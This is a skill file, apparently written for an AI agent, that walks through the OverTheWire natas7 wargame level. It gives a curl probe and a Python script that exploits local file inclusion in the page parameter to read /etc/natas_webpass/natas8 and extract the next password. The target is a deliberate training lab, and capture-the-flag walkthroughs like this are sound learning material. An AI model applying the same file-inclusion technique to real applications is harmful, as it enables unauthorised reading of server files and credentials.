---
name: natas-7
description: >-
  Use when solving OverTheWire natas7: given natas7 credentials, exploit the
  page= LFI to read /etc/natas_webpass/natas8 and extract the natas8 password.
---
# natas7

**Input:** username and password for natas7.

**Weakness:** `index.php` includes the `page` query parameter as a file path with no sanitization (local file inclusion). The password file is at `/etc/natas_webpass/natas8` (also noted in an HTML hint).

**Network:** run on a host that can reach `natas7.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. (Optional) Confirm the hint and the vulnerable parameter:

```bash
curl.exe -s -u USER:PASS http://natas7.natas.labs.overthewire.org/
```

You should see links like `index.php?page=home` and a comment pointing at `/etc/natas_webpass/natas8`.

2. Derive the natas8 password via LFI (never hardcode it). Save this as `solve.py` and run `python solve.py USER PASS`:

```python
#!/usr/bin/env python3
import base64, re, sys, urllib.request
user, password = sys.argv[1], sys.argv[2]
auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
url = "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
req = urllib.request.Request(url, headers={"Authorization": auth})
html = urllib.request.urlopen(req, timeout=30).read().decode()
m = re.search(r"</a>\s*<br>\s*<br>\s*([A-Za-z0-9]{32})\s*\n\s*<!-- hint:", html)
if m:
    print(m.group(1))
else:
    candidates = [c for c in re.findall(r"\b([A-Za-z0-9]{32})\b", html) if c != password]
    print(candidates[0])
```

3. The printed string is the natas8 password.

4. Confirm by GETting `http://natas8.natas.labs.overthewire.org/` with Basic Auth `natas8:<password>` and expecting HTTP 200.
